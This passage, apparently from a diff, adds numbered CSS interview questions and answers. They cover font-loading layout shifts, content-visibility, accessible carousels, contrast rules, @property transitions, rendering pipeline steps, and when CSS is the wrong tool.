+- An iframe whose `color-scheme` doesn't match its parent gets an opaque background (to keep text readable). If the embedded page doesn't declare a scheme, you can see a white box inside a dark page.
+
+### 442: Why do layout bugs sometimes only appear after fonts load?
+
+Before the web font loads, the browser lays out text with the fallback font. When the web font arrives, text gets wider or narrower and line heights may change. That can:
+
+- Make a heading wrap to two lines and push content down (CLS).
+- Make a button that fit its label overflow.
+- Change `scrollHeight` or measured sizes that JavaScript read too early.
+
+Fixes: adjust fallback metrics (`size-adjust`, `ascent-override`), avoid fixed widths around text, and measure in JS after `document.fonts.ready`. `font-display: optional` avoids the late change completely.
+
+### 443: What's the difference between hiding content with `content-visibility: hidden` and `display: none`?
+
+Both hide the content and remove it from the accessibility tree. The difference is what the browser keeps:
+
+- `display: none`: the element generates no box at all. Its rendering state is thrown away, and showing it again needs full style and layout.
+- `content-visibility: hidden`: the element's own box stays (it takes up space based on `contain-intrinsic-size`), and the browser can **keep the rendering state** of its contents. Showing it again is much faster.
+
+This makes `content-visibility: hidden` useful for things like virtual tab panels or cached views that switch often.
+
+### 444: How do you keep visual order and DOM order in sync in responsive layouts?
+
+- Write the DOM in a logical reading order first. Then use grid areas to place things visually at each breakpoint, but avoid putting items in a visual order that conflicts with reading order.
+- Avoid `order`, `row-reverse` and `dense` for meaningful content.
+- If a sidebar must appear before the main content on desktop and after it on mobile, decide which order is correct for screen reader and keyboard users and keep that in the DOM.
+- Test by tabbing through the page at each breakpoint.
+- Where you can't avoid a mismatch, `reading-flow` (Chromium) can help, but don't depend on it yet.
+
+### 445: How would you build a pure CSS carousel with good accessibility?
+
+Scroll snap gives the motion. Newer Chromium features add controls:
+
+```css
+.carousel {
+  display: grid;
+  grid-auto-flow: column;
+  grid-auto-columns: 85%;
+  gap: 1rem;
+  overflow-x: auto;
+  scroll-snap-type: x mandatory;
+  overscroll-behavior-x: contain;
+}
+.carousel > * { scroll-snap-align: center; }
+
+/* Chromium: generated arrow buttons and dots */
+.carousel { scroll-marker-group: after; }
+.carousel::scroll-button(right) { content: "→" / "Next"; }
+.carousel::scroll-button(left)  { content: "←" / "Previous"; }
+.carousel > *::scroll-marker { content: ""; width: 10px; height: 10px; border-radius: 50%; background: gray; }
+.carousel > *::scroll-marker:target-current { background: black; }
+```
+
+`::scroll-button()` and `::scroll-marker` are Chromium-only so far, so other browsers get the scroll-snap carousel without buttons. Keep each slide reachable by keyboard and give the region an accessible label (`role="region"` and `aria-label`).
+
+### 446: How do you check color contrast, and what are the rules?
+
+WCAG 2 contrast ratios:
+
+- **4.5:1** for normal text.
+- **3:1** for large text (about 24px, or 18.66px bold), and for UI parts like borders of inputs and focus indicators.
+
+Check with DevTools (the color picker shows the ratio and the AA/AAA lines), axe or Lighthouse. Watch for:
+
+- Text on images or gradients. Check the worst spot, or add an overlay.
+- Placeholder text, which is often too light.
+- Disabled states, which are exempt but should still be readable.
+- Dark mode and hover states, which need checking separately.
+
+The newer APCA method (proposed for WCAG 3) measures contrast better for dark mode and thin fonts, but WCAG 2 ratios are still what legal requirements use.
+
+### 447: What should you know about CSS `transition` on custom properties?
+
+Unregistered custom properties are strings, so a transition on them jumps at the end (or halfway) instead of animating. To transition one, register it with `@property` and a type:
+
+```css
+@property --progress {
+  syntax: "<percentage>";
+  inherits: false;
+  initial-value: 0%;
+}
+.ring {
+  background: conic-gradient(#4f46e5 var(--progress), #e5e7eb 0);
+  transition: --progress 600ms ease-out;
+}
+.ring[data-value="75"] { --progress: 75%; }
+```
+
+Then everything that uses the property animates, even things that can't be animated directly, like gradient stops.
+
+### 448: How do you write CSS for very large DOMs (for example a spreadsheet or log viewer)?
+
+- **Virtualize**: only render visible rows. This is the most important step, and it's done in JavaScript.
+- **Contain**: `contain: strict` on the scroll container and `contain: content` on rows, so updates stay local.
+- **Fixed sizes**: fixed row heights and `table-layout: fixed` or fixed grid tracks, so layout doesn't depend on content.
+- **Simple selectors**: flat class selectors, and no `:has()` or `:nth-child` across thousands of rows.
+- **Cheap updates**: change one row's class instead of a parent's state, and avoid changing inherited custom properties high in the tree.
+- **`content-visibility: auto`** for long non-virtualized sections.
+
+### 449: What happens from downloading a CSS file to pixels on screen?
+
+1. The HTML parser finds `<link rel="stylesheet">` (or the preload scanner finds it early) and requests the file. Rendering is blocked until it arrives.
+2. The bytes are decoded and **tokenized**, then **parsed** into rules, which are added to the CSSOM. Invalid parts are dropped.
+3. The browser indexes the rules by key selector (id, class, tag) to make matching fast.
+4. **Style calculation**: for each element, matching rules are found and the cascade picks the winners (origin, layers, specificity, order). Values are computed, and inherited values are passed down.
+5. **Layout**: box sizes and positions are worked out using the formatting contexts (block, inline, flex, grid).
+6. **Paint**: draw commands are recorded for each layer, in stacking order.
+7. **Composite**: layers are rasterized (often on the GPU) and put together into the final frame.
+
+Later changes run only the steps they need: style, then layout, then paint, then composite.
+
+### 450: When should you not solve something with CSS?
+
+CSS can do a lot now, but some things belong elsewhere:
+
+- **State that matters to the app** (selected items, form data, auth state). Keep it in JavaScript or the server. A `:checked` hack that holds important state is easy to break.
+- **Content and meaning**. Text in `::before` or `content` isn't part of the document, can't be copied, and may be missed by assistive tech.
+- **Accessibility semantics**. CSS can't make a `div` act like a button. Use the right HTML element or ARIA.
+- **Complex interaction logic**, like drag and drop, keyboard shortcuts or focus trapping. CSS can style it, JavaScript should run it.
+- **Security**. Hiding something with CSS doesn't protect it. It's still in the HTML.
+
+A good rule is to use the right layer: HTML for structure and meaning, CSS for presentation and simple visual states, and JavaScript for behavior and data.
 
